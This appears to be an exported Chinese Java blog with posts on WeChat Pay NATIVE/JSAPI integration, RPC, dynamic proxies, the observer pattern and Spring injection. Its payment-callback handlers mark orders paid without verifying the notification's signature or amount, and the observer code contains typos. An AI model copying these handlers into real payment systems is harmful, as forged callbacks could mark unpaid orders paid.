EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;, orderNumber)); Map&lt;String,String&gt; paraMap = new HashMap&lt;&gt;(); paraMap.put(&quot;appid&quot;,wxpayConfig.getApp_id()); paraMap.put(&quot;body&quot;,info.getOrderProject()); paraMap.put(&quot;mch_id&quot;,wxpayConfig.getMch_id()); paraMap.put(&quot;nonce_str&quot;, WXPayUtil.generateNonceStr()); String randomNum = (int)((Math.random()*9+1)*100000)+&quot;&quot;; String orderNo =randomNum+orderNumber; paraMap.put(&quot;out_trade_no&quot;,orderNo); paraMap.put(&quot;spbill_create_ip&quot;,wxpayConfig.getSpbill_create_ip()); String total_fee = info.getOrderMoney().multiply(new BigDecimal(&quot;100&quot;)).intValue()+&quot;&quot;; paraMap.put(&quot;total_fee&quot;,total_fee); paraMap.put(&quot;trade_type&quot;,&quot;NATIVE&quot;); paraMap.put(&quot;notify_url&quot;,&quot;http://XXXX.com/XXXX/api/wxnotifyPC&quot;); String apiKey = wxpayConfig.getApi_key(); String sign = WXPayUtil.generateSignature(paraMap,apiKey); paraMap.put(&quot;sign&quot;,sign); String xml = WXPayUtil.mapToXml(paraMap); //统一下单 https://api.mch.weixin.qq.com/pay/unifiedorder String unifiedorder_url = &quot;https://api.mch.weixin.qq.com/pay/unifiedorder&quot;; String xmlStr = HttpUtil.sendPost(unifiedorder_url,xml,false); System.out.println(xmlStr); //以下内容是返回前端页面的json数据 String prepay_id = &quot;&quot;;//预支付id String code_url = &quot;&quot;; if (xmlStr.indexOf(&quot;SUCCESS&quot;) != -1) { Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(xmlStr); prepay_id = (String) map.get(&quot;prepay_id&quot;); code_url = (String)map.get(&quot;code_url&quot;); } Map&lt;String, String&gt; payMap = new HashMap&lt;String, String&gt;(); payMap.put(&quot;appId&quot;, wxpayConfig.getApp_id()); payMap.put(&quot;timeStamp&quot;, WXPayUtil.getCurrentTimestamp()+&quot;&quot;); payMap.put(&quot;nonceStr&quot;, WXPayUtil.generateNonceStr()); payMap.put(&quot;signType&quot;, &quot;MD5&quot;); payMap.put(&quot;code_url&quot;,code_url);//将code_url返回给前台 payMap.put(&quot;package&quot;, &quot;prepay_id=&quot; + prepay_id); String paySign = WXPayUtil.generateSignature(payMap, wxpayConfig.getApi_key()); payMap.put(&quot;paySign&quot;, paySign); return payMap; }将数据发送给https://api.mch.weixin.qq.com/pay/unifiedorder，你可以判断返回是否成功，成功时候有一个code_url,也就是二维码的url。 一般格式weixin://wxpay/bizpayurl?pr=ByrALdk 生成二维码，可以调用qrcode.js库 教程 new QRCode(document.getElementById(&quot;qrcode&quot;), &quot;weixin://wxpay/bizpayurl?pr=ByrALdk&quot;);调用这个方法会生成支付二维码 后台回调方法 获取信息 成功后，修改订单状态，返回success给微信 @RequestMapping(&quot;/wxnotifyPC&quot;) public String wxnotifyPC(HttpServletRequest request,HttpServletResponse response){ InputStream is = null; try{ is = request.getInputStream(); String xml = WXPayUtil.inputStream2String(is); Map&lt;String,String&gt; notifyMap = WXPayUtil.xmlToMap(xml); String orderNumber = &quot;&quot;; if(notifyMap.get(&quot;return_code&quot;).equals(&quot;SUCCESS&quot;)) { orderNumber = notifyMap.get(&quot;out_trade_no&quot;).substring(6); OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;, orderNumber)); info.setOrderState(1); orderInfoService.updateById(info); String amount = notifyMap.get(&quot;total_fee&quot;); System.out.println(&quot;实际付款：&quot;+amount); } response.getWriter().write(&quot;&lt;xml&gt;&lt;return_code&gt;&lt;![CDATA[SUCCESS]]&gt;&lt;/return_code&gt;&lt;/xml&gt;&quot;); is.close(); } catch (Exception e) { e.printStackTrace(); } return null; }思考，前台 前台，在扫码后如何跳转支付页面，因为二维码出现后，我并不知道这个二维码是否被手机扫码，所以我在这个扫码界面 设置了定时器1，二维码生成后。1秒执行查询的ajax，对这个order查询是否成功，如果成功，返回订单界面。 定时器2，1小时刷新二维码，如果这个用户停留在这个界面，防止二维码失效","categories":[],"tags":[{"name":"支付","slug":"支付","permalink":"http://yoursite.com/tags/%E6%94%AF%E4%BB%98/"},{"name":"微信支付","slug":"微信支付","permalink":"http://yoursite.com/tags/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98/"},{"name":"NATIVE","slug":"NATIVE","permalink":"http://yoursite.com/tags/NATIVE/"}]},{"title":"微信支付jsapi","slug":"微信支付jsapi","date":"2019-01-23T08:28:32.000Z","updated":"2020-11-14T17:11:08.124Z","comments":true,"path":"2019/01/23/微信支付jsapi/","link":"","permalink":"http://yoursite.com/2019/01/23/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98jsapi/","excerpt":"","text":"微信支付jsapi商户已有H5商城网站，用户通过消息或扫描二维码在微信内打开网页时，可以调用微信支付完成下单购买的流程。 开发步骤 技术博客 jspi支付，是指微信公众号里面的打开网站，支付大致流程 获取所需参数 发送给统一下单的接口 根据返回的参数，进行解析，如果成功，将部分参数发送给前台。注意前台的浏览器是微信内置浏览器，有一个内置的js对象，可以通过js对象，调起支付 最后跳转到结果页面 正式开发 jsapi统一下单api列表下面列举必须字段 Appid,mch_id,nonce_str,sign,body,out_trade_no,total_fee,spbill_create_ip,notify_url,trade_type,openid 注意： total_fee是分为单位 String total_fee = info.getOrderMoney().multiply(new BigDecimal(&quot;100&quot;)).intValue()+&quot;&quot;;说下不好获取的 spbill_create_ip :我当时就是写了127.0.0.1，我并不清楚怎么获取 notify_url :写公网可以访问的地址，最好去看下官网的介绍， out_trade_no :前6位是随机数，后面是数据库中实际的订单编号，这样是为了回调的时候获取订单编号，当然也可以使用别的方法。 openid :是指一个用户到一个公众号，对应的一个key，是唯一的，获取方法 文档 我的思路是，先获取code，H5界面里面，有一个去支付按钮，而去支付按钮是一个超链接 https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx1111111111111111&amp;redirect_uri=http%3A%2F%2Fm.XXXX.com%2FpayList.html%3ForderNumber%3D&quot;+orderNum+&quot;&amp;response_type=code&amp;scope=snsapi_base&amp;state=123#wechat_redirect&quot;;这里面的redirect_uri需要格式化 import java.net.URLEncoder; String formatUrl = URLEncoder.encode(&quot;http://m.XXXX.com/payList.html?orderNumber=XXXXXXX&quot;,&quot;UTF_8&quot;);跳转回来的时候是 http://m.XXXX.com/payList.html?orderNumber=XXXXXXX&amp;code=sdhjsdhfjhasjhfhjasdhbavbnb这个code呢，你开发在电脑端是看不见的，这也就是微信坑的地方，所以你 下载微信开发者工具 获取code之后，点击微信支付，发送ajax请求给后台 @RequestMapping(&quot;/payH5&quot;) @ResponseBody public Object payH5(@RequestParam(&quot;orderNumber&quot;) String orderNumber, @RequestParam(&quot;type&quot;) Integer type, HttpServletRequest request, HttpServletResponse response,@RequestParam(value = &quot;code&quot;,defaultValue = &quot;&quot;)String code) throws Exception{ try{ OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;, orderNumber)); ModelAndView modelAndView = new ModelAndView(); //支付宝支付 if(type.intValue()==1){ response.sendRedirect(&quot;http://m.XXXX.com/alipay.html?orderNumber=&quot;+orderNumber); //微信支付 }else if(type.intValue()==0){ if(&quot;&quot;.equals(code)){ return &quot;返回错误界面&quot;; } WxpayConfig wxpayConfig = new WxpayConfig(); //此处获取openid,后台发请求给，通过code，appId，appsecret String res = HttpUtil.sendGet(&quot;https://api.weixin.qq.com/sns/oauth2/access_token&quot;, &quot;appid=&quot;+wxpayConfig.getApp_id()+&quot;&amp;secret=&quot;+wxpayConfig.getApp_secret()+&quot;&amp;code=&quot;+code+&quot;&amp;grant_type=authorization_code&quot;); JSONObject json = JSONObject.parseObject(res); String openId = json.getString(&quot;openid&quot;); Map&lt;String,String&gt; paraMap = new HashMap&lt;&gt;(); paraMap.put(&quot;appid&quot;,wxpayConfig.getApp_id()); paraMap.put(&quot;body&quot;,info.getOrderProject()); paraMap.put(&quot;mch_id&quot;,wxpayConfig.getMch_id()); paraMap.put(&quot;nonce_str&quot;, WXPayUtil.generateNonceStr()); paraMap.put(&quot;openid&quot;,openId); String randomNum = (int)((Math.random()*9+1)*100000)+&quot;&quot;; String orderNo =randomNum+orderNumber; paraMap.put(&quot;out_trade_no&quot;,orderNo); paraMap.put(&quot;spbill_create_ip&quot;,wxpayConfig.getSpbill_create_ip()); String total_fee = info.getOrderMoney().multiply(new BigDecimal(&quot;100&quot;)).intValue()+&quot;&quot;; paraMap.put(&quot;total_fee&quot;,total_fee); paraMap.put(&quot;trade_type&quot;,wxpayConfig.getTrade_type()); paraMap.put(&quot;notify_url&quot;,&quot;http://XXXX.com/XXXX/api/wxnotify?orderNumber=&quot;+orderNumber); String apiKey = wxpayConfig.getApi_key(); String sign = WXPayUtil.generateSignature(paraMap,apiKey); paraMap.put(&quot;sign&quot;,sign); String xml = WXPayUtil.mapToXml(paraMap); //统一下单 https://api.mch.weixin.qq.com/pay/unifiedorder String unifiedorder_url = &quot;https://api.mch.weixin.qq.com/pay/unifiedorder&quot;; String xmlStr = HttpUtil.sendPost(unifiedorder_url,xml,false); //以下内容是返回前端页面的json数据 String prepay_id = &quot;&quot;;//预支付id if (xmlStr.indexOf(&quot;SUCCESS&quot;) != -1) { Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(xmlStr); prepay_id = (String) map.get(&quot;prepay_id&quot;); } Map&lt;String, String&gt; payMap = new HashMap&lt;String, String&gt;(); payMap.put(&quot;appId&quot;, wxpayConfig.getApp_id()); payMap.put(&quot;timeStamp&quot;, WXPayUtil.getCurrentTimestamp()+&quot;&quot;); payMap.put(&quot;nonceStr&quot;, WXPayUtil.generateNonceStr()); payMap.put(&quot;signType&quot;, &quot;MD5&quot;); payMap.put(&quot;package&quot;, &quot;prepay_id=&quot; + prepay_id); String paySign = WXPayUtil.generateSignature(payMap, wxpayConfig.getApi_key()); payMap.put(&quot;paySign&quot;, paySign); return payMap; } return &quot;&quot;; }catch (Exception e){ e.printStackTrace(); } return &quot;end&quot;; // return new SuccessResponseData(); }获取sign 获取sign 下载后，里面有一些工具类，WXPayUtil里面有一个方法可以获取 返回数据到前台后，前台调用js对象，执行 WeixinJSBridge.invoke( &apos;getBrandWCPayRequest&apos;, { &quot;appId&quot;:appId, //公众号名称,由商户传入 &quot;timeStamp&quot;:timeStamp, //时间戳,自1970年以来的秒数 &quot;nonceStr&quot;:nonceStr, //随机串 &quot;package&quot;:package, &quot;signType&quot;:signType, //微信签名方式： &quot;paySign&quot;:paySign //微信签名 }, function(res){ console.log(res); window.location.href = &quot;http://m.XXXX.com/orderDetail.html?orderNum=&quot;+orderNumber; // if(res.err_msg == &quot;get_brand_wcpay_request:ok&quot; ) { // console.log(&apos;支付成功&apos;); // //支付成功后跳转的页面 // }else if(res.err_msg == &quot;get_brand_wcpay_request:cancel&quot;){ // console.log(&apos;支付取消&apos;); // }else if(res.err_msg == &quot;get_brand_wcpay_request:fail&quot;){ // console.log(&apos;支付失败&apos;); // } //使用以上方式判断前端返回,微信团队郑重提示：res.err_msg将在用户支付成功后返回ok,但并不保证它绝对可靠。 }就会执行微信支付，不管成功没有，都会跳转到orderDetail界面，查看order详情 微信回调 微信会返回结果 我应该处理什么 告诉微信，我收到了，返回success 对订单信息，获取orderNum，对订单状态进行更新 @RequestMapping(&quot;/wxnotify&quot;) public String wxnotify(HttpServletRequest request,HttpServletResponse response){ InputStream is = null; try{ is = request.getInputStream(); String xml = WXPayUtil.inputStream2String(is); Map&lt;String,String&gt; notifyMap = WXPayUtil.xmlToMap(xml); if(notifyMap.get(&quot;return_code&quot;).equals(&quot;SUCCESS&quot;)) { String orderNumber = notifyMap.get(&quot;out_trade_no&quot;).substring(6); OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;, orderNumber)); info.setOrderState(1); orderInfoService.updateById(info); String amount = notifyMap.get(&quot;total_fee&quot;); System.out.println(&quot;实际付款：&quot;+amount); } response.getWriter().write(&quot;&lt;xml&gt;&lt;return_code&gt;&lt;![CDATA[SUCCESS]]&gt;&lt;/return_code&gt;&lt;/xml&gt;&quot;); is.close(); } catch (Exception e) { e.printStackTrace(); } return null; }","categories":[],"tags":[{"name":"支付","slug":"支付","permalink":"http://yoursite.com/tags/%E6%94%AF%E4%BB%98/"},{"name":"微信H5支付","slug":"微信H5支付","permalink":"http://yoursite.com/tags/%E5%BE%AE%E4%BF%A1H5%E6%94%AF%E4%BB%98/"},{"name":"jsapi springboot","slug":"jsapi-springboot","permalink":"http://yoursite.com/tags/jsapi-springboot/"}]},{"title":"读梁飞-RPC框架几行代码就够了   有感","slug":"读梁飞-RPC框架几行代码就够了   有感","date":"2018-12-30T13:59:59.000Z","updated":"2020-11-14T17:11:08.901Z","comments":true,"path":"2018/12/30/读梁飞-RPC框架几行代码就够了   有感/","link":"","permalink":"http://yoursite.com/2018/12/30/%E8%AF%BB%E6%A2%81%E9%A3%9E-RPC%E6%A1%86%E6%9E%B6%E5%87%A0%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%B0%B1%E5%A4%9F%E4%BA%86%20%20%20%E6%9C%89%E6%84%9F/","excerpt":"","text":"梁飞-dubbo框架的设计者，是一位阿里的资深架构师 RPC框架几行代码就够了，这篇文章十分适合不是很了解RPC的人看一遍，最好是自己敲一遍。注释，对入参的处理，对流用后进行关闭，动态代理的使用。这边文章地址： https://javatar.iteye.com/blog/1123915 首先将一下，为什么用RPC( Remote Procedure Call )远程工程调用。什么情况下会用到，一个公司的项目可能大可能小，小的项目，可能一个项目，而有些项目，可能光代码和jar就能有1G大小，这时候就会设计到分布式，会将原本的项目进行拆分，拆分成多个小项目，让不同的团队去负责不同的模块。项目中如果用到别的项目的接口，这个时候就用到了RPC。当然，这是拆分项目，也可以在创建项目的时候，就是分布式的。 *那么我们就具体谈谈 这篇博文中的如何实现的RPC * ： 首先有两个项目（举例），分别为：生产者，消费者。生产者：一直启动服务，为消费者提供服务，并暴露服务消费者：启动应用，通过host，port，service.class三个参数去确定具体调用的是那个接口host，port是为了锁定生产者是哪台机器那个端口，servcice.class为了锁定调用接口的class。 消费者和生产者之间是使用java中自带的socket进行通信的。消费者： HelloService service = RpcFramework.refer(HelloService.class, &quot;127.0.0.1&quot;, 1234); 这里面具体用到了是我上一篇博客中提到的动态代理技术，在运行中动态生成的，而这边这个动态代理里面，会用到socket进行远程通信，将调用的接口，方法，参数，通过socket写过去，然后用一个ObjectInputStream（阻塞式的）来接收从生产者返回的数据 生产者：先提供一个socketServer并确定端口，可以接收socket传过来的数据。这是一个whiletrue的方式。因为是可以不断循环，查看是否有人连接的这个socketServer服务器，如果接收的数据，就开一个线程来接收数据，并返回数据。这里面不是真正的调用，而是通过反射的方式，直接method.invoke()的方式获得这个方法的返回值，并将返回值通过socket写回去，返回给消费者。。这边的开线程的好处，更多的是让程序可以并行的处理数据，而不是处理了一个方法，在处理中，第二个方法来了，而无法对其进行服务，增加服务能力。 当然，这篇博文里面更多的是一种示范，这边连接的时候，可以使用netty，当然只是道听途说 刚刚去看了dubbo在github里面的issue， https://github.com/apache/incubator-dubbo/issues/3088 我对里面的问题进行了截图 都是国人吧，但是一般都会使用英文交流，这就是一种氛围吧，而且一个公司敢于将自己的产品开源出去，就是一种态度。我还记得这里面就有一些同样是互联网公司","categories":[],"tags":[{"name":"rpc","slug":"rpc","permalink":"http://yoursite.com/tags/rpc/"}]},{"title":"面试之代理","slug":"面试之代理","date":"2018-12-23T09:53:51.000Z","updated":"2020-11-14T17:11:09.792Z","comments":true,"path":"2018/12/23/面试之代理/","link":"","permalink":"http://yoursite.com/2018/12/23/%E9%9D%A2%E8%AF%95%E4%B9%8B%E4%BB%A3%E7%90%86/","excerpt":"","text":"昨天面试碰到了面试官问spring的时候，问完ioc，然后下个问题我以为是aop，后来才听清是动态代理，感觉回答的不是太好，也是好久不接触 1.静态代理代理模式也就委托模式。三个角色： Subject抽象主题角色：接口 RealSubject具体主题角色：接口的实现类，业务逻辑的具体执行者 Proxy代理主题角色：也叫做委托类，代理类。它负责对真实角色的应用，负责真实角色前后前后做预处理和善后处理。 在这里面Subject是一个借口，里面有一个Request（）方法，RealSubject类实现了Subject这个接口，并且实现了request（）方法，而在Proxy也实现了Subject接口，proxy里面还有一个变量Subject，可以通过构造函数将RealSubject注入，在实现request方法时，其实是调用的是Realsubject里面的request方法，在调用request（）方法前后可以调用一些其他的方法。下面是具体的代码 Subject.java public interface Subject { //定义一个方法 public void request(); }RealSubject.java public class RealSubject implements Subject { @Override public void request() { //业务逻辑处理 } }Proxy.java public class Proxy implements Subject { private Subject subject = null; public Proxy(Subject subject){ this.subject = subject; } @Override public void request() { before(); subject.request(); after(); } public void before(){ //do something } public void after(){ //do something } }代理模式的使用场景为什么要使用代理呢？想想现实世界吧，打官司为什么要找个律师？因为你不想参与中间过程的是是非非，只要完成自己的答辩就行了，其他的比如事前调查、事后调查都由律师搞定，这就是为了减轻你的负担。代理模式的使用场景非常多，可以看见Springaop，这是非常典型的动态代理 二：动态代理动态代理是在实现阶段不用关心代理谁，而在运行阶段才指定代理哪一个对象。相对来说，自己写代理类的方式就叫静态代理划重点，在运行阶段指定哪一个对象具体代码，逻辑待会再说 抽象主题 public interface Subject { /** * //业务操作 * @param str */ void doSomething(String str); /** * 吃 * */ void eat(String str); }真实主题 public class RealSubject implements Subject { @Override public void doSomething(String str) { System.out.println(&quot;do something!----&gt;&quot; + str); } @Override public void eat(String str) { System.out.println(&quot;今天晚上吃&quot;+str); } }动态代理的handler类 public class MyInvocationHandler implements InvocationHandler { /** * 被代理的对象 */ private Object target; public MyInvocationHandler(Object target){ this.target = target; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { //log Before System.out.println(&quot;log before:&quot;+&quot;method: &quot;+method.getName()+ &quot;return :&quot;+method.getReturnType().getSimpleName()); Object result = method.invoke(target,args); System.out.println(&quot;log after: &quot;+new Date(System.currentTimeMillis())); return result; } }动态代理类 public class DynamicProxy&lt;T&gt; { public static &lt;T&gt; T newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler handler){ //返回目标，并返回结果 return (T) Proxy.newProxyInstance(loader,interfaces,handler); } }动态代理的场景类 public class Client { public static void main(String[] args) throws IOException { //定义一个代理类 Subject subject = new RealSubject(); //定义一个Handler InvocationHandler handler = new MyInvocationHandler(subject); //定义主题的代理 Subject proxy = DynamicProxy.newProxyInstance(subject.getClass().getClassLoader(),subject.getClass().getInterfaces(),handler); //代理的行为 System.out.println(proxy.getClass().getCanonicalName()); proxy.doSomething(&quot;finish&quot;); proxy.eat(&quot;香锅里辣家的麻辣香锅&quot;); //此处可以将 byte[] proxyClass = ProxyGenerator.generateProxyClass(proxy.getClass() .getSimpleName(), proxy.getClass().getInterfaces()); //将字节码文件保存到D盘，文件名为$Proxy0.class FileOutputStream outputStream = new FileOutputStream(new File( &quot;d:\\\\$Proxy0.class&quot;)); outputStream.write(proxyClass); outputStream.flush(); outputStream.close(); } }分析过程： Subject proxy = DynamicProxy.newProxyInstance(subject.getClass().getClassLoader(),subject.getClass().getInterfaces(),handler);_在我们使用proxy.doSomthing(args);proxy.eat(args); __我们可以想象出，DynamicProxy.newProxyInstance（args）这个方法返回了一个proxy对象 _我们可以看到是调用了这个方法*newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) * @CallerSensitive public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException { Objects.requireNonNull(h); final Class&lt;?&gt;[] intfs = interfaces.clone(); final SecurityManager sm = System.getSecurityManager(); if (sm != null) { checkProxyAccess(Reflection.getCallerClass(), loader, intfs); } /* * Look up or generate the designated proxy class. */ // 此处就讲class生成好了 Class&lt;?&gt; cl = getProxyClass0(loader, intfs); /* * Invoke its constructor with the designated invocation handler. */ try { if (sm != null) { checkNewProxyPermission(Reflection.getCallerClass(), cl); } final Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams); final InvocationHandler ih = h; if (!Modifier.isPublic(cl.getModifiers())) { AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() { public Void run() { cons.setAccessible(true); return null; } }); } // 通过构造参数重新创建实例 return cons.newInstance(new Object[]{h}); } catch (IllegalAccessException|InstantiationException e) { throw new InternalError(e.toString(), e); } catch (InvocationTargetException e) { Throwable t = e.getCause(); if (t instanceof RuntimeException) { throw (RuntimeException) t; } else { throw new InternalError(t.toString(), t); } } catch (NoSuchMethodException e) { throw new InternalError(e.toString(), e); } }最后这个方法会在运行中生成一个类，名字叫：com.sun.proxy.$Proxy0而我们并没有找到这个类，可以通过我们上面的Client里面的将这个运行中生成的类打印出来，我们来看看，这个类是什么样子的$Proxy0.class,反编译 public final class $Proxy0 extends Proxy implements Subject { private static Method m1; private static Method m2; private static Method m3; private static Method m4; private static Method m0; public $Proxy0(InvocationHandler var1) throws { super(var1); } public final boolean equals(Object var1) throws { try { return (Boolean)super.h.invoke(this, m1, new Object[]{var1}); } catch (RuntimeException | Error var3) { throw var3; } catch (Throwable var4) { throw new UndeclaredThrowableException(var4); } } public final String toString() throws { try { return (String)super.h.invoke(this, m2, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } public final void doSomething(String var1) throws { try { super.h.invoke(this, m3, new Object[]{var1}); } catch (RuntimeException | Error var3) { throw var3; } catch (Throwable var4) { throw new UndeclaredThrowableException(var4); } } public final void eat(String var1) throws { try { super.h.invoke(this, m4, new Object[]{var1}); } catch (RuntimeException | Error var3) { throw var3; } catch (Throwable var4) { throw new UndeclaredThrowableException(var4); } } public final int hashCode() throws { try { return (Integer)super.h.invoke(this, m0, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } static { try { m1 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;equals&quot;, Class.forName(&quot;java.lang.Object&quot;)); m2 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;toString&quot;); m3 = Class.forName(&quot;com.husky.dynamicproxy.Subject&quot;).getMethod(&quot;doSomething&quot;, Class.forName(&quot;java.lang.String&quot;)); m4 = Class.forName(&quot;com.husky.dynamicproxy.Subject&quot;).getMethod(&quot;eat&quot;, Class.forName(&quot;java.lang.String&quot;)); m0 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;hashCode&quot;); } catch (NoSuchMethodException var2) { throw new NoSuchMethodError(var2.getMessage()); } catch (ClassNotFoundException var3) { throw new NoClassDefFoundError(var3.getMessage()); } } }首先$Proxy0这个类extends Proxy implements Subject有一个静态代码块，会反射生成Method类，也就是给 $Proxy这个类的变量赋值举例我在调用proxy.doSomething()这个方法时我们其实是调用 public final void doSomething(String var1) throws { try { super.h.invoke(this, m3, new Object[]{var1}); } catch (RuntimeException | Error var3) { throw var3; } catch (Throwable var4) { throw new UndeclaredThrowableException(var4); } }调用的是super.h.invoke(this, m3, new Object[]{var1});这个h也就是实现InvocationHandler接口的MyInvocationHandler类。将这个$Proxy0，m3， newObject[]{var1}这些变量传过去 博客也会发布在博客园，博客园的博客都会是非常认真的，而不像csdn一样杂乱具体代码：https://github.com/pompeii666/proxy 这篇博客耗时，一周，断断续续，白天工作回来，吃个饭，洗个澡，就想睡觉。","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"}]},{"title":"年前的感想","slug":"年前的感想","date":"2018-12-07T06:00:48.000Z","updated":"2020-11-14T17:11:10.274Z","comments":true,"path":"2018/12/07/年前的感想/","link":"","permalink":"http://yoursite.com/2018/12/07/%E5%B9%B4%E5%89%8D%E7%9A%84%E6%84%9F%E6%83%B3/","excerpt":"","text":"今年和往年不一样，算是人生的变化吧。上半年3月到7月一直在无锡实训，之后就是经历面试公司，也算是第一次体验到社会的样子。后来来到了亚信，公司是真的大，在我看来。刚到这，就感觉到大公司的做事，测试开发运维。进的组也非常好，每周都有奶茶喝，每周二晚上有知识培训，一般是轮换人去讲。现在想想，如果这个组是在别的公司就好了，这样的氛围真的好，前几天离职，正赶上聚餐，那天喝了一杯。 现在就在找工作，昨天去面试了一家，很小但是工资还不错，希望能过。我觉得一个人的成功，需要经过很多历练","categories":[],"tags":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"设计模式之禅-观察者模式","slug":"设计模式之禅-观察者模式","date":"2018-10-25T07:23:57.000Z","updated":"2020-11-14T17:11:11.095Z","comments":true,"path":"2018/10/25/设计模式之禅-观察者模式/","link":"","permalink":"http://yoursite.com/2018/10/25/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%A6%85-%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"观察者模式（Observer Pattern） **也叫做 发布订阅模式 **(Publish/subscribe),它是在一个项目中经常使用的模式，定义如下：Define a one-to-mang dependency between objects so that when one objectchanges state,all its dependents are notified and updated automatically（定义对象间一种一对多的依赖关系，使得每当一个对象改变状态，则所有依赖于它的对象都会得到通知并被自动更新。） Subject：被观察者 定义被观察者必须实现的职责，它必须能够动态添加、删除观察者。它一般是抽象类或者实现类，仅仅完成作为被观察者必须实现的职责：管理观察者并通知观察者（notifyObservers） Observer观察者 观察者收到信息后，即进行update操作，对接收的信息进行处理 观察者是被被观察者管理的 ConcreteSubject具体的被观察者 定义被观察者自己的业务逻辑，同时定义对哪些时间进行通知。 ConcreteObserver具体的观察者 每个观察者在接收到消息后处理反应是不同，各个观察者有自己的处理逻辑。 被观察者抽象接口public interface Observable { //添加一个观察者 public void addObserver(Observer observer); //删除一个观察者 public void deleteObserver(Observer observer); //通知所有观察者 public void notifyObservers(String context); }具体实现类 public class Subject implements Observable{ //定义一个观察者数组 private Vector&lt;Observer&gt; obsverVector = new Vector&lt;Observer&gt;(); //添加一个观察者 public void addObserver(Observer observer){ obsver.add(observer)； } //删除一个观察者 public void deleteObserver(Observer observer){ obsverVector.remove(obserber); } //通知所有观察者 public void notifyObservers(String context){ for(Observer o : obsverVector){ o.update(context); } } //业务逻辑，dosomething时通知所有在数组中的观察者 public void dosomething(){ /** dosth */ notifyObservers(&quot;dosth&quot;); } }观察者接口public interface Observer { //根据被观察者推送的信息，观察者进行更新信息 public void update(String context); }具体的client中说下思路 先建立subject实例 然后建立不同的观察者实例 subject里面添加不同的观察者实例（当然也可以删除） 在subject更新事件的时候（可以通知观察者）优点 观察者和被观察者之间是抽象耦合(增加观察者还是被观察者都非常容易扩展) 建立一套触发机制（被观察者改变，触发导致观察者发生变化） 缺点 观察者模式需要考虑开发效率和运行效率，一个被观察者，多个观察者。开发和调试比较复杂，而且java中消息通知是顺序执行，一个观察者卡壳或者挂了，会影响整体的执行效率。在这种情况下，一般考虑采用异步的方式。 异步处理问题异步处理就要考虑线程安全和队列的问题，还是看一看Message Queue,会有更深的了解。（作者表示：没看过，以后再看）","categories":[],"tags":[{"name":"设计模式之禅","slug":"设计模式之禅","permalink":"http://yoursite.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%A6%85/"},{"name":"观察者模式","slug":"观察者模式","permalink":"http://yoursite.com/tags/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/"}]},{"title":"spring依赖注入（二）-java注入，xml注入，混合注入","slug":"spring依赖注入（二）-java注入，xml注入，混合注入","date":"2018-10-22T09:41:00.000Z","updated":"2020-11-14T17:11:11.597Z","comments":true,"path":"2018/10/22/spring依赖注入（二）-java注入，xml注入，混合注入/","link":"","permalink":"http://yoursite.com/2018/10/22/spring%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89-java%E6%B3%A8%E5%85%A5%EF%BC%8Cxml%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%B7%B7%E5%90%88%E6%B3%A8%E5%85%A5/","excerpt":"","text":"java注入 @Configuration public class CDPlayerConfig { @Bean public CompactDisc compactDisc(){ return new SgtPeppers(); } @Bean public CDPlayer cdPlayer(CompactDisc cd){ return new CDPlayer(cd); } }在测试类中 @RunWith(SpringJUnit4ClassRunner.class) @ContextConfiguration(classes = CDPlayerConfig.class)//此处用这样的，当然，classes是可以写多个 public class CDPlsyerTest { @Autowired private MediaPlayer player; @Test public void play(){ player.play(); } }xml注入首先了解：c命名空间 简化 构造器 的属性赋值p命名空间 简化 set方法 的属性赋值 1.简单版：第一种：构造器注入 &lt;bean id=&quot;compactDisc&quot; class=&quot;com.husky.spring.collections.BlankDisc&quot;&gt; &lt;constructor-arg value=&quot;Sgt. Pepper&apos;s Lonely Hearts Club Band&quot;/&gt; &lt;constructor-arg value=&quot;The Beatles&quot;/&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band&lt;/value&gt; &lt;value&gt;With a Little Help from My Friend&lt;/value&gt; &lt;value&gt;Lucy in the sky with Diamonds&lt;/value&gt; &lt;value&gt;Getting Better&lt;/value&gt; &lt;value&gt;Fixing a Hole&lt;/value&gt; &lt;value&gt;She&apos;s leaving Home&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;bean id=&quot;cdPlayer&quot; class=&quot;com.husky.spring.CDPlayer&quot;&gt; &lt;constructor-arg ref=&quot;compactDisc&quot;/&gt;//ref是引用 